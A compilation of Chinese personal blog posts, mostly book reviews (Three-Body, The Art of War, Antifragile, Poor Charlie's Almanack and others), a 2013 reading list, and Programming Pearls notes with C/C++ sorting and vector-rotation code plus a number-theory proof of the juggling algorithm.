最神奇的感受是。当年不到二十岁，读完后，对罗辑崇拜，对韦德敬畏，对程心鄙夷。现在要奔三了，却发现自己越来越像程心了。不知是年龄大了，还是怎得，对他人、世界和人类越来越温柔善良。质疑程心，理解程心，成为程心。也更理解了书中的一些细节：为什么罗辑会愿意交出手中的执剑人权力，即使知道对自己和对人类的后果。为什么章北海在执行黑暗森林操作对付友舰时会有所迟疑。为什么即使是威慑度快满的韦德，最后也遵守诺言，交出权力，即使预见到对自己和对人类的后果。人类是智慧，情感，兽性的结合，大刘的观点显然是对人类生存来说 智慧>兽性>情感 的。借韦德口说出的”失去人性，失去很多；失去兽性，失去一切“就十分有代表性。但就是这情感，每次在关键时刻起到重要作用，改变历史和人类命运。当然，每次都是往万劫不复的方向改变。即使如此，人类仍然无法摆脱人性的束缚，强如韦德，最后也无法剔除所有人性，完全按照理性和兽性做决定。

剧集，讨论最多的应该就是第一集。著名的”爱因斯坦他有奶便是娘“，不了解那段历史，十年”艰辛探索“，也就不会理解叶文洁的反人类人格如何被塑造出来，也不好理解，她的行为和立场（其实是 降临派）。虽然剧集改编很多，但这一段确实是还原原著了，部分反映历史。大刘 其实已经很克制表达和隐晦了，20年前还能写出来出版，现在估计够呛。
Source: YoungForest's blog

**华杉讲透《孙子兵法》**
豆瓣链接

看完《狂飙》，也来看《孙子兵法》。原版看不懂，来看解读。老高的视频也看了，确实牛。高启强一本“孙子兵法”定“京海市”，从一个小鱼贩，成长为一代黑白势力老大。当然只靠孙子兵法有些夸张，但确实是必要条件。读完后，感觉“孙子兵法”就像是武侠小说里的“九阴真经”，虽然是讲兵法，但因为万事万物后面有千丝万缕的联系。其中的不少道理，放在商业，甚至个人生活中也是有用的，尤其是投资理财。之前了解到的一个信息模型：“智慧，知识，和信息”，是从重要到次要，从少到多的。真正的智慧是大道至简的，几句话就能说清楚的。孙子兵法，主要讲的就是智慧和知识，还有如何搜集信息和情报，所以才能五千年经久不衰。

对我启发最大，对普通生活最有价值的几点：
Source: YoungForest's blog

**时势 周期波动下的国家、社会和个人**
本书豆瓣链接

小Lin是我最喜欢的UP主之一了。美女、学霸、华尔街投行、创业。各种引人注目的标签。而且她的视频确实质量比较高，制作精良，然后又通俗易通。看她的书支持一下。全书的内容，其实她的视频里都讲过，甚至讲的还更好。毕竟视频展示各种图表也更方便。所以，其实不读这本书，只看她的油管或B站视频也是足够的。读本书最神奇的地方在于，自带语音功能。不得不感叹人类大脑的强大，读的时候，脑袋里面会自动播放小Lin的语音和视频，算是一次不错的体验了。而且也就当是复习一下之前的视频里讲的知识。

不过，还是要强调一点。小Lin的视频和书，都是科普向的，虽然宏观经济的干活不少，但总体是轻松娱乐向的。虽然又很多文献和数据做支撑，但仍然显得十分浅显，许多因果关系也并未如她分析的那样。毕竟经济学是十分复杂的学问。很多时候是拿着后视镜去寻找原因，而不是根据现在预测未来。炒股或关注经济的朋友，应该都有这个感受。每个分析师分析的都不一样，而且话也不说死，最后过了半年，发现和当初分析的大相径庭，但仍能自圆其说。我自己也关注了一些投资的UP主，在这里就不举例和介绍给大家了，免得误人子弟。
Source: YoungForest's blog

**李宗吾 厚黑学**
豆瓣链接

千万别被书名骗了，望文生义，以为这是一本成功学书籍，看完后，就能学到脸厚心黑，成为英雄豪杰。其实不然，这本书主要是一本讽刺历史和社会现实得书。厚黑学成书于民国初年，正是社会剧烈变革之际。中国传统的学说被反思和打倒，西方现在学说又未被完全接受。厚黑学教主，正是在这个背景下，写出了这部讽刺学说。真是把旧中国的仁义道德撕个粉碎，揭露了社会黑暗的现实。

虽然已经过了一百多年，中国社会已经初步实现现代化，进步了不少。但书中很多讽刺竟然仍然可以针砭时弊。果然优秀的作品都是经久不衰的，因为讲的都是人性。纵使社会变迁，科技进步，但人类的进化是很慢的，只是在不同环境下激发出不同的表现。所以，只要掌握深层的人性，表象的东西就不会怎么变。比如 鲁迅 的文章，放在今天仍然让大家彷徨呐喊。比如 是，大臣or首相. 虽然写的是英国50年的政坛，但今天很多台词依然适用，甚至适用于其他国家。

本书说的“做官六字真言”，就是如此，”空、恭、绷、凶，聋、弄“，”空，即空洞的意思。一是文字上，凡是批呈词、出文告，都是空空洞洞的，其中奥妙，我难细说，请到军政各机关，把壁上的文字读完，就可恍然大悟；二是办事上，随便办什么事情，都是活摇活动，东倒也可，西倒也可，有时办得雷厉风行，其实暗中藏有退路，如果见势不佳，就从那条路抽身走了，绝不会把自己牵连着。……”其他的也十分准确，对上恭，对下绷。真是把官僚体制讽刺个透透的。这些一百多年前的文字，今天仍然如此，甚至由于社会的发展，更是如此。民国时那种百家争鸣，反思和批判的声音反而没有了。

还有“厚黑经”，模仿论语的话术，写了很多 宗吾说。真是把讽刺效果拉满。类似现在互联网论坛上的各种段子手，真是又讽刺又搞笑。又把自己的“厚黑学”和王阳明的“致良知”所对应，真是从先秦，到宋儒，再到心学，都剖析了个遍。

孟子云：君之视臣如草芥，则臣视君如寇仇。厚黑学其实只是李宗吾写的很多议论文中的几篇，也是最著名的。剩下的文章也值得一读，很多是对传统儒学，尤其是宋代及以后的程朱理学的反对和抨击。正是近代以来，不断有这些文人，借用西方理性和科学的方法，对儒学的反思。中国文化才能渐渐摆脱糟粕，接近现代文明。
Source: YoungForest's blog

**六神磊磊读金庸**
豆瓣链接

是六神磊磊同名公众号文章的集合，以不同金庸小说分类，一次性读完，大快人心。多次拍手称快。

因为本身是微信公众号的文章，所以十分擅长吸引流量和观众。语言轻松诙谐，又十分有道理，算是对金庸小说的一些独特解读。作者十分读过很多遍小说，因此对于不同小说里的人物信手拈来，擅长横向（同一小说里的不同人物）和纵向（不同小说中的类似人物）对比，甚至很多小人物的遭遇和命运也都如数家珍。不仅关注主角们，也关注配角们，而且全是从他们各自的角度出发。体现出一个“悲天悯人”。这也是作者认为，金庸小说的核心之一。另一个是“侠之大者，为国为民”。角度也十分现代化，有时又跳出江湖，以公司或现实生活类比，幽默效果就出来了。

尤其是很多金庸小说里，本身就有很多的借古讽今，借江湖讽刺当时的政治。六神磊磊当然也不敢揭露的太明显，只捡了一些无关痛痒的话来讲。希望有生之年，可以看到大家放开心讲话，这样的文学和社会都会有趣很多。

王小波说过一句话：“在中国，历史以三十年为极限，我们不可能知道三十年以前的事。”
Source: YoungForest's blog

**六神磊磊读唐诗**
有种“当年明月”的“明朝那些事儿”的感觉呀。不知道是刻意模仿，还是无意为之。

经常和金庸小说互动，尤其是同样的“悲天悯人”。

岳灵珊“自怜自伤还自怨，不悔情真不悔痴。”

知识分子借古讽今，在文章中委婉表达观点是常态。磊磊 特意写了一篇“放下筷子骂娘的白居易”，表达对如今言论管制环境的不满，和唐代开放包容的向往和怀念。

这一年读了太多的现实主义书，获得了不少知识和智慧。但这本书是最有浪漫主义色彩的，令人十分感动。

唐诗的四种套路：田园有宅男，边塞多愤青，咏古伤不起，送别满基情。

“我们经常把赞美等同于忠诚，把批评等同于敌对，这实在是一个天大的误区，罗隐告诉我们：从来都没有这个等式。”和如今的社会现实如此相似。
Source: YoungForest's blog

**纳瓦尔宝典 财富与幸福，人生智慧的集合**
豆瓣链接

前半本财富，适合35岁前读，改变现状。很多智慧也是世界上比较公认和容易的。后半本幸福，适合35岁后读，接受现状。但就比较主观和因人而异了，属于更大的智慧，也更加难得了。最后Die with zero (也是一本书).

和之前读过的很多书都串起来了，真就是一份宝典。很多智慧只是只言片语，就讲清楚了。比如，“原子习惯”中如何培养好习惯，摒弃坏习惯，习惯的重要性；“金钱心理学”中财富的定义，如何获得财富；再如 “进化心理学”，“欲望的演化”中关于人类心理学和两性心理的论述。当然，这些书都写的详细的多，可操作性更强，属于术的部分。“纳瓦尔宝典”是一个集锦，纳瓦尔作为一个聪明人，读过很多书的人，几十年来积累的智慧总结。用他所推崇的“费曼学习法”，讲给大家。不同的人，有不同的人生阅历和阅读，感受就完全不一样。真是相见恨晚。

痛苦时刻的一个定义是：当你看到实物的真面目不是你本来想要的样子时，你是痛苦的。

对美好现实的渴求蒙蔽了对真实世界的认知。所谓痛苦，就是无法继续无视事实。

科学最重要的是可证伪性。

纳瓦尔推荐阅读原著和经典。但不敢苟同，很多原著都是几百年，上千年的历史了。阅读门槛很高，也不容易理解，有些内容也会过时或受局限。比如“孙子兵法”虽然只有5千多字，但直接去读就很难。我选择读了“华杉”的讲解版本。也可能是我太菜了吧。

“如果能活1000次，那么其中的999次，我都过着成功的生活。”纳瓦尔的成功不是靠运气，而是靠自己的认知。就像冯小刚的“1942”中的 张国立 说的那样，“再给他十年他还能成为地主。”当然大环境也很重要。我当然相信 张国立 是知道怎么重新白手起家的，也会成功。但土地革命、社会主义改造、人民公社的历史进程很快就到来了。通过像“白鹿原”中贫民紧衣缩食，心思活泛，丰年屯粮，灾年买地，成长为地主的日子已经一去不复返了。迎接他的，也只是千百年未有之大变局。

智慧是一种知道个人行为的长期后果的思维能力。
Source: YoungForest's blog

**穷查理宝典 查理芒格的人生智慧**
每周一本书 18:穷查理宝典:查理芒格的人生智慧

查理芒格去年底去世，享年99岁。惭愧现在才读集他思想大成的“穷查理宝典”。算是凝结他80年思想智慧的产物，因为原书第三版成书于2008年。最近看了太多的成功学书籍，对未来和自己真是充满了期待和自信。

读传记，研究那些获得成功的人生和其他那些留下遗憾或者遭遇失败的人生。

没有一个芒格认识的成功的朋友是不喜欢读书的。

“迅速歼灭不该做的事情，接着对该做的事情发起熟练的、跨学科的攻击，然后，当合适的机会来临—只有当合适的机会来临—就采取果断地行动”。和“孙子兵法”的思想很像，孙子兵法不愧是三千年的经典，是人类智慧的总结。

简化人物的最佳方法一般是先解决那些答案显而易见的大问题。 伽利略说，唯有数学才能揭示科学的真实面貌，因为数学似乎是上帝的语言。 光是正面思考问题时不够的，你必须进行反面思考。 最好的、最具有实践性的智慧是基本的学术指挥。前提：以跨学科的方式思考。 lollapalooza效应，通常在几种因素的共同作用下才会出现。

爱因斯坦：我的成就取决于四个因素，首先是自我批评，然后才是好奇心、专注和毅力。

我只想知道将来我会死在什么地方，这样我就永远不去那儿了。

后面有多篇演讲稿，内容有些类似，其实是继承关系。第11讲是最长，也是集大成者。
Source: YoungForest's blog

**太白金星有点烦 马亲王解构西游记**
马伯庸新作，十分，推荐。后记中说是消遣之作，读起来也确实畅快和消遣,2天读完，爱不释手。私认为质量仅次于长篇“古董局中局”，超过“两京十五日”，“长安十二时辰”和“长安的荔枝”，“我读书少，你可别骗我”，“显微镜下的大明”。亲王的书，我也是读了不少。算是最喜欢的当代中国作家了。一个作家的书能让我读这么多的，国外还有一个“东野圭吾”，国内还有一个“金庸”。

解构了经典四大名著之“西游记”，凭借对人性和官场的洞察，写的故事反而比原版更有说服力，也更符合现代叙事。其中的冤假错案，山头斗争，权力制衡，发挥的淋漓尽致。很早就听说过一种说法（大概是早年知乎上看到的），孙悟空之所以大闹天宫，是被天庭刻意为之的，趁此各个部门把锅甩给齐天大圣，尤其是地府的“生死簿”，估计本身就是很多漏洞，趁此销毁证据。“太白”恰好把此观点发扬光大，借取经表演，也揭露500年前大闹天宫的真相。扩展成一部10万字的中篇小说。读起来诙谐幽默，让人捧腹，但细思又极恐。其中不乏揭露现实，或借古讽今之意，但也充满着“马伯庸”一贯的悲天悯人，悬疑反转。
Source: YoungForest's blog

**反脆弱 从不确定性中获益**
保守主义，自由主义，乐观主义 的盛宴。

纳西姆.塔勒布 是 纳瓦尔 和 李总 都很推荐的一位作家，或许他们也叫他哲学家。

反脆弱更像是成功学书籍，告诉人们要拥抱压力、坏的东西，从而获得恢复性的成长。其实就像是“七龙珠”里赛亚人的被动技能一样，每次从濒死状态恢复过来，战斗力都会成倍增长。贝吉塔就用过此技能开挂刷战斗力，但最后还是被弗利沙杀死了。

在爱尔兰的2年，真是躺平和安逸。少不入欧。人都要呆废了。虽然生活很幸福，但没有了恢复性成长。

也让我想起中学时代接受的教育，为了高考作文学的那些名言。想想之前的掉书袋和爱用典故，真是年轻气盛。

孟子云：天将降大任于是人也，必先苦其心志，劳其筋骨，饿其体肤，空乏其身，行拂乱其所为，所以动心忍性，曾益其所不能。入则无法家拂士，出则无敌国外患者，国恒亡。生于忧患，死于安乐。

司马迁在“史记 太史公自序”和“报仁安书”中也说：

盖西伯拘而演《周易》；仲尼厄而作《春秋》；屈原放逐，乃赋《离骚》；左丘失明，厥有《国语》；孙子膑脚，《兵法》修列；不韦迁蜀，世传《吕览》；韩非囚秦，《说难》、《孤愤》；《诗》三百篇，大底圣贤发愤之所为作也。

回顾自己的成长经历，不也是如此吗。发现自己的反脆弱性还是蛮强的。去年（23年）从各个角度讲，都是我近几年的人生低谷。但慢慢地，开始触底反弹。今年获得的成长性真的是超越过去任何阶段。现在的我，似乎又来到一个新的高度。

大公司和政府似乎并不明白信息的反作用力，事实上，信息有能力控制那些试图控制它的人。当你听到一家公司或一个负债累累的政府表示要”重新注入信心“，那么你就应该知道它们是脆弱的，注定失败。信息是无情的：越是召开新闻发布会来”安抚“投资者，越会吓跑投资者，导致死亡螺旋或银行挤兑。

反脆弱性的产生是有条件的。压力源的刺激频率非常重要：人类在急性刺激下会比在慢性刺激下表现得更出色，尤其是在急性刺激后给予较长得恢复期，这将使得这些压力源成为信息得传导渠道。…比一个温和但连续不断的压力源有益，后者大多是让你在生活中感到压抑的东西，包括按揭贷款、税务问题、因拖欠报税而产生的内疚、考试压力、琐碎事务、电子邮件回复、填写表格、每天上下班通勤，等等。换句话说，这是文明带来的压力。

我是J人喜欢确定性。看来不确定性也要很大益处，有时要主动接受不确定性，拥抱变化。但之后一定要给自己恢复和成长的时间。

如果你还或者，你的内心深处就会喜欢一定程度的随机性和混乱。

平均斯坦 VS. 银行白领

城邦制 VS. 有证据表明没有 的区别。

在政治领域，一个好的体制就是有助于社会淘汰坏人的体制，它不必考虑做什么事或者有谁执政。因为一个坏人造成的伤害可能大于一群好人集体所做出的努力。

公司都热衷于制订战略计划。它们需要花钱来弄明白自己究竟该走向何方。然而，没有证据表明，战略规划起到了作用—否定它的证据倒有很多。

国家不也是这样吗。尤其是大政府，市场经济国家。

在医学界的黑暗时代，医生曾经非常依赖于一些天真的理性主义想法，比如必须平衡身体的体液，疾病被认为源于某些不平衡，根据这些想法所衍生出的一系列治疗方法被认为是恢复身体平衡的必要手段。

比如，臭名昭著的放血疗法。然而，即使到了21世纪，中医仍然甚嚣尘上。回顾历史，其实没有所谓中西西医的对立，而是现代医学和传统医学的对立。西方之前也有各种类似中医的疗法和观点，只不过被历史所淘汰了。当我像外国人表达中医时，我说traditional doctor，然后说了疗法。他说，你意思是witch doctor

作者旁征博引，让我一个从小受东方教育的人，也意识到，西方同样也有着悠久的历史和文化传承。塔勒布是黎巴嫩人，东正教区域。从苏美尔文明，到希腊罗马文明，再到其实不那么黑暗的中世纪，文艺复兴，科学和工业革命的现代文明，其实也是一脉相承的呀。美索不达米亚的苏美尔文明是最早的人类文明，公元前4500年就创造了灿烂的文明。黄帝（公元前2600年）的车轮和很多发明，其实就是从地中海东岸一步一步传过来的。即使是夏朝（当然有所争议，因为历史记载和考古发现对不上。我是倾向于存在的，考古发现之后也许会跟上。因为夏朝也是所谓的部落联盟，也没有文字，考古发现更难些。我也比较认同，二里头文明就是夏朝），也是公元前2000年。现在民族主义是，法国大革命才诞生的，距今不过200多年。中国的民族主义也是鸦片战争后才慢慢建立，抗日战争后完备的。所以不必为了民族主义，阻碍文明认同。三星堆的事实和发掘大概就是受阻于此。
Source: YoungForest's blog

**迷人的温度 温度计里的人类、地球和宇宙史**
A Matter of Degrees: What Temperature Reveals about the Past and Future of Our Species, Planet, and Universe

豆瓣链接

十分。“穷查理宝典”的推荐书籍，我从那本书过来的。芒格在书中强调，跨学科知识的重要性，或许这就是他推荐此书的原因吧。确实如此，本书集合多门学科大成，深入简出，是本优秀的科普书籍。虽然很多知识和历史都是我所知道的，但是通过“温度”这一物理变量，把医学，生物学（包括进化论），物理学（光、热、量子力学），地质学，化学都串在一起。当不同学科融会贯通，历史的发展交织在一起的时候，不得不感叹科学和人类文明的伟大。就像书中所说，从宇宙大爆炸，到太阳系的诞生，地球的诞生，再到生命，最后到人类来思考这些间接和直接创造人的这一切。让我读来多次拍手称快，爱不释手，3天读完。生而为人，我很幸运和骄傲。尤其是生活在21世纪，站在那么多巨人的肩膀上。享受着他们的发现和创造，过着舒适和幸福的生活。

最有意思的部分是，在“太阳的诞生”章节，作者提到，太阳因为核心聚变的进程，核心温度是不断升高的。因为越重的原子核需要更高的温度，才能抗衡电磁斥力，产生聚变。现在的太阳是50亿年前，释放能量的30%多。之后也会越来越亮。这对地球不是什么好消息。再过10亿年，也许地球会步入金星后尘，变成一个温室效应严重，过热的星球。生命或将在地球上灭绝。但是科学家已经提出了解决方法，如果人类可以继续存在的话，可以通过驾驭小行星，利用引力弹弓（其实是发射太阳系探测器加速的常用技巧）的效应，每次从地球掠过的时候，把地球往外推一点，然后小行星会回到木星之外补充能量。然后人类再通过火箭，改变轨道，再次返回地球。每六千年一个周期，火箭的功率其实也不需要很大，因为时间长，产生的动量就大了。几十亿年后，地球就会到今天火星的轨道上。地球可以保持适宜的温度，为生命延长几十亿年的时间。真是科学版流浪地球，比大刘的行星核聚变引擎方案可行的多。当然大刘的背景是需要更快的走，引力弹弓虽然可行省力，但需要的时间也更久。当然《流浪地球》里的设定是，太阳会几千年内发生毁灭的氦闪，这不是科学的。当然50亿年后，太阳还是要变成红巨星，吞没地球和火星的。之后就生命需要移民到木星和更外的轨道了（这次没法带着地球一起走了），甚至是其他的恒星系。

曾几何时，我也是有所谓“科学家”的理想的，初高中的时候，也是对物理十分感兴趣。差点报考南大的物理系或天文物理系了。小时候就喜欢读“十万个为什么”，“动物世界”，还订阅了科学杂志（忘记名字了，但真的很喜欢。印象最深刻的是讲，地平线号发射，将会十多年后访问冥王星的故事。当时冥王星还是九大行星之一。长大后，它真的到了，掠过冥王星。发回了探测数据，并开始离开太阳系了。但冥王星早被踢出行星行列，现在只有八大行星了）。高中的时候，也读了加来道雄的《平行宇宙》，霍金的《时间简史》，《果壳里的宇宙》。甚至是人教版的物理课本，都把物理学和那些科学家的故事讲的绘声绘色，令人神往。大学也读了加莫夫的《从一到无穷大》。来了爱尔兰后，读了《上帝掷色子吗》，《现实不似你所见》。如果你喜欢这些书的话，《迷人的温度》肯定也会十分符合你的胃口的。

回想自己小时候也是充满了求知欲和理想主义，却在现实和社会的规训下，变得如今十分现实主义了。尤其是在国内的教育体制之下，剥夺了孩子们的多样性和求知欲，质疑与勇气。即使最后考上很好的大学，读了热门的专业，做了体面的工作，赚了可以的钱。但仍然也算是自怜自爱。唉，伤仲永呀。有些同学即使大学读了物理，大多也在社会的压力下转了码。我有个高中同学，一直读到高能物理博士，去年在巴黎联合培养两年。当时还去拜访和参观了他的实验室。但也去昧了。学物理确实是穷，就业面也窄。做的学术内容，日常也是读论文，写代码，分析实验数据和模拟。还是读科普书或看故事更精彩。身在其中的人，也是绝大多数要做很多枯燥的工作的。而且物理、数学这些很看天赋，多少知名的科学家都是年少有成，25岁之前就可以证明自己。我自己已经太老了。不过作为门外汉，关注这些科学的重大进展，还是很让人激动和开心的。多少次回想起，年少时第一次读到这些科学故事和知识的时候。

第三章，”读懂地球“。也是十分有借鉴意义的，尤其是我一直很喜欢看B站上一个叫”芳斯塔夫“的UP主，讲生物进化的。很多地质和生活演化历史事件，和”芳斯塔夫“的都串起来了。这种感觉真是神奇。提到和分析了”温室效应“，但更加理性和客观，对二氧化碳的排放也更加从容和容忍。不像之前白左的极端观点，当然现如今白左也降温了。气候议题已经不如几十年前那么火热了。
Source: YoungForest's blog

**深奥的简洁 从混沌、复杂到地球生命的起源**
每周一本书22：深奥的简洁 从混沌、复杂到地球生命的起源

“穷查理宝典”推荐的书籍，从混沌的角度理解宇宙、生命和社会，十分有趣的角度。通过混沌，这一数学上的概念，把宇宙中很多事情都穿起来了。虽然我们有许多的物理学知识，看似对世界了解很多，可以做到预测历史和未来，像拉普拉斯认为的那样。但事实和理论证明了，这是不可能的。计算宇宙最好也是唯一的方案就是宇宙本身，无法在宇宙中制作出这样的机器或生命，去计算和预测宇宙。这是数学的限制，如果像很多先贤说的那样，数学是上帝的语言。那看来这一语言也是天生有限制的，不是全知全能的。当然数学也一直在进展，但从目前的证明来看，很多方程是没有解析解的。迭代解注定是蝴蝶效应。相比“迷人的温度”那本书稍差。虽然我自认为有一定的数理基础背景，但还是被本书的数学和论证搞得有些糊涂了。

有意思的是，前一本书提到“流浪地球”的方案。本书则是以，“三体”问题开端。三体问题不可解，不是物理的错，而是数学的错，而且是数学已经证明了不可解。因此，如果“地球往事”里，三体组织的拯救派看过这部作品，也就会放弃拯救“主”的想法。当然，“三体”书中，最后拯救派也证明了此事，并且在与降临派的斗争中失败。可以说，他们的策略从根上就是不可能和注定失败的。
Source: YoungForest's blog

**【编程珠玑】第一章**
C语言 /* Copyright (C) 1999 Lucent Technologies */ /* From 'Programming Pearls' by Jon Bentley */ /* qsortints.c -- Sort input set of integers using qsort */ #include <stdio.h> #include <stdlib.h> int intcomp(int *x, int *y) { return *x - *y; } int a[1000000]; int main() { int i, n=0; while (scanf("%d", &a[n]) != EOF) n++; qsort(a, n, sizeof(int), intcomp); for (i = 0; i < n; i++) printf("%d

", a[i]); return 0; } C++语言 /* Copyright (C) 1999 Lucent Technologies *//* From 'Programming Pearls' by Jon Bentley */ /* sortints.cpp -- Sort input set of integers using STL set */ #include <iostream> #include <set> using namespace std; int main() { set<int> S; int i; set<int>::iterator j; while (cin >> i) S.insert(i); for (j = S.begin(); j != S.end(); ++j) cout << *j << "

"; return 0; }
Source: 不忘初心 方得始终

**2013我的私人阅读十佳**
微信“不止读书”的主人魏小河最近发起了“私人阅读十佳”的活动，让筒子们对这一年的阅读做一个梳理和盘点。看了几个书单，基本上每个书单都有我看过的很喜欢的书，
趁着博客刚刚搭好，自己也总结了一下。不过10本实在是太难选，太难选，好多好书都未能选上。 1.中国历代政治得失  这是我经常向人推荐的，钱穆先生的名号想必不必多言。钱老从政治组织，选举制度，经济制度，兵役赋税制度对汉、唐、宋、明、清五朝进行了分析。真的是有理有据，很有思考性，书也薄，不到200页。其实我很喜欢钱老的风格，钱穆强调不要因为政治需要就用专制、黑暗否定，抹杀过去的一切，而是要从对历代的政制进行深刻的分析，尊重历史客观。 2.平如美棠  这本书真的很令人感动，讲的其实只是一对平凡夫妻的事情，里面有一段话我一直都记得“对我们平凡人而言，生命中许多微细小事，并没有什么特别缘故地就在心深处留下印记，天长日久便成为弥足珍贵的回忆。”
就如很多年之前，作为一个很有理想的骚年，一味的向前，错失了很多东西，多年之后我才明白，活在当下才是最重要的，平凡真的不是一个坏事。顺说，这本书的装帧很好，很有感觉。 3.明朝那些事  如果你因为传统教育对历史有一种小恐惧，不妨看一看这套书，小说笔法写就的历史书，有趣亦不失史实。读史真的能够让一个人的胸怀变得很广很广，几百年的兴衰荣辱看过去，你就会觉得你眼前的这些个事就都不是事
一个人真的只是历史长河中很小很小的、及其偶然的存在，你要做的就是做你自己。 4.洪业:清朝开国史  很巧的是，这本书恰好就是从明末开始介绍到清朝建立、顺治登基这一过程的，对南明也有一些讲述，可以说是承接了《明朝那些事》后续。这本书还是比较学院，从里面的注解就能看出。其实成就任何一番事业都是不容易的，
看看从努尔哈赤到皇太极到顺治是如何成就他们的“洪业”就知道了。 5.追寻现代中国  这本书是也是洋人研究中国历史的，还不错。据说国外对近代史的研究是从16世纪开始的，也就是从我国的明朝，这本书也是。看完本书对中国近代史会有一个大致的脉络。当然，个人觉得还是1840之后的历史更值得研究，我们是如何一步一步走到现在，都能从近代史中找出自己的思考。 6.东方历史评论  今年出的历史杂志，至今出了三期，主编是许知远，这个人的八卦我知道的比较少，只知道本科是北大微电子的。这本杂志还是真心不错的，特别是每一期的专题。比如第一期专题是，共和的失败，探讨了清末明初的中国政治走向，读来令人一片唏嘘，忍不住掩卷沉思，如果换一种路，中国今天在何方。 7.江城  这本书是从阿娇那里介绍过来的，海斯勒的三部曲之首，另外两本是《甲骨文》与《寻路中国》，也非常好看。本书讲的是作者作为了一个来到江边小城涪陵2年教学经历。这本书文字很美，这个确实是要有些水平的。更重要的是，此书从一个外国人角度，记录了中国城市变迁的一个缩影。我觉得涪陵人民还是应该要感谢作者的，他为涪陵留下了一段历史。 8.国会现场  这本书是讲民初实行宪政时关于国会的。近两年民国热的似乎太泛滥了，不过，民国、近代史确实有太多被误解的地方，值得学者们深入研究。孔子作春秋而乱臣贼子惧，虽然今天早已是礼崩乐坏的时代，很多人的所作所为已不可用无耻形容，但是史家自有记述。我不认同孙中山“军政、训政、宪政”，看了这本书之后，更加觉得无耻的是那些政客，只是一代人有一代人的事情，我们亦不应对他们有太多苛责。 9.小城故事  作者是李静睿，我们四川自贡的人，跟郭敬明是一个地方的哦。她的文字让人很舒服。其实她之前是一个记者，也是一个对时局有着自己的看法与想法的人。这本书讲的是自贡小城的一些人和事，看的时候自然而然会把自己代入那种川南小城的氛围，简单而又美好，很多能让我回想到小镇的点点滴滴，那些平凡生活，那些或淡或浓的记忆 也仿佛能够看到自己以后的生活，那些注定的疏远，那些无法追溯的美好。 10. 红太阳是怎样升起的 作者是已故著名学者高华教授。刘瑜貌似说过要读懂中国革命史只要《红太阳是怎样升起的》以及《牛鬼蛇神录》就好了，我觉得真心是这样的。《红》以公开出版的大量史料对延安整风的前后过程进行了深入的分析，据说让体制内能够接触到秘密史料的人都佩服他的对史实的推理。当然，这是一本禁书。 本来想写几本技术书籍的，奈何今年上半年忙毕设，下半年俗务缠身，大部头的书很多都没有看完，大概有2本书个人觉得还可以的，一本是《APUE》，还有一本是《虚拟机：系统与进程的通用平台》。还有一点想要提及的是这里面不少大部头都是用kindle看的，感觉真是不错，读书神器。
Source: 不忘初心 方得始终

**杂耍算法及其证明**
这是编程珠玑上面的一个题，也是笔试中出烂了的题目。题目非常简单，描述如下：将一个n元一维向量向左旋转i个位置，例如当n=8，i=3时，向量abcdefgh旋转为defghabc。简单的代码使用一个n元的中间向量在n步内完成该工作。你能否仅使用额外字节的存储空间，在正比于n的时间内完成向量的旋转？

下面是最简单的一种解法。

#include <iostream> using namespace std; void reverse(char *a,int beg, int end) { char tmp; for (; beg < end; beg++, end-- ) { tmp = a[beg]; a[beg] = a[end]; a[end] = tmp; } } void LeftReverse(char *a,int n, int k) { reverse(a,0,k - 1); reverse(a,k,n - 1 ); reverse(a,0,n - 1); } int main() { char test[] = "123abcdefg" ; LeftReverse(test,strlen(test),3); printf( "reversed:%s",test); return 0; }

当然，今天的主题不是这个，而是书中提到的另一种解法：英文是啥给忘了，翻译成“杂耍算法”。这个算法的步骤是这样的：move x[0] to the temporary t, then move x[i] to x[0], x[2i] to x[i], and so on, until we come back to taking an element from x[0], at which point we instead take the element from t and stop the process. If that process didn’t move all the elements , then we start over at x[1], and continue until we move all the elements.具体代码如下：

#include <iostream> using namespace std; int gcd(int a,int b) { int c; if (a < b) { c = a; a = b; b = c; } while(b) { if(a % b == 0) return b; else { c = a % b; a = b; b = c; } } } void rotate(char * a,int n, int k) { char tmp; int j; for (int i = 0; i < gcd(n,k); ++i) { tmp = a[i]; for (j = i + k; j!= i; j = (j + k) % n) { a[(j-k+n) % n] = a[j]; } j = (j - k + n ) % n; a[j] = tmp; } } int main() { char a[] = "abc12345678" ; cout << "gcd(11,3):" << gcd(11,3) << endl; rotate(a,11,3); printf ( "after rotate:%s

",a); return 0; }

经过如下图所示的步骤之后，就完成了移位，此例中i=3,n=11。

这个算法会在执行\(gcd（i,n）\)次后就停止了，为什么？这就涉及到数论知识了，也就是今天的主题。

数论中有这样一个结论：\(n\)个数

\[0\,mod\,n,\quad i\,mod\,n,\quad 2i\,mod\,n,\quad \cdots,\quad (n-1)i\,mod\,n\quad (1)\]

按照某种次序恰好组成\(\frac{n}{d}\)个数

\[0,\quad d,\quad 2d,\quad \cdots,\quad n-d\quad \quad (1)\]

的\(d\)份复制，其中\(d=gcd(i,n)\).例如，当\(n=12\)且\(i= 8\)时，有\(d=4\)，这些数就是\(0,8,4,0,8,4,0,8,4,0,8,4\).

证明（指出我们得到前面\(\frac{n}{d}\)个值的\(d\)份复制）的第一部分是显然的，根据同余式的基本理论，我们有

\[ji\equiv ki(mod\,n)\Leftrightarrow j\frac{i}{d}\equiv k\frac{i}{d}(mod\,\frac{n}{d})\]

可以看到当\(0\leqslant k< \frac{n}{d}\)时，我们得到了就是这\(\frac{n}{d}\)个数的\(d\)份复制，\(k\)的取值就是模数为\(\frac{n}{d}\)的最小完全非负剩余系中的数。

现在证明这\(\frac{n}{d}\)个数就是\({0,d,2d,\cdots,n-d}\)（按照某种次序排列）。记\(i={i}'d,n={n}'d\).根据mod的分配率\(c(x\,mod\,y)=(cx)\,mod\,(cy)\),就有

\[ki\,mod\,n=d(k{i}'\,mod\,{n}')\]

所以当\(0\leqslant k< {n}'\)时出现的那些值就是\(d\)乘以以下诸数

\[0\,mod\,{n}',\quad {i}'\,mod\,{n}',\quad {2{i}'}\,mod\,{n}',({n}'-1){i}'\,mod\,{n}'\]

我们知道\(({i}',{n}')=1\)，所以我们只需要证明\(d=1\)的情况，也就是\(i\)与\(n\)互素的情况。

现在我们假设\((i,n)=1\)，(1)式中的数是各不相同的，如若不然，取\(k,j\in [0,n-1],k

eq j\)，假设\(ki=ji\)，则有\(ki\equiv ji(mod\,n)\)。由于\((i,n)=1\)，则\(k\equiv j(mod\,n)\)，所以\(k=j\)，显然矛盾。所以(1)中的数恰好就是\(0,1,2,\cdots,n-1\)

结论证完，下面回到例子简要分析，在本例中\(n=11,i=3,gcd(11,3)=1\)，于是

\[0,3\,mod\,11,6\,mod\,11,\cdots,10*3\,mod\,11\]

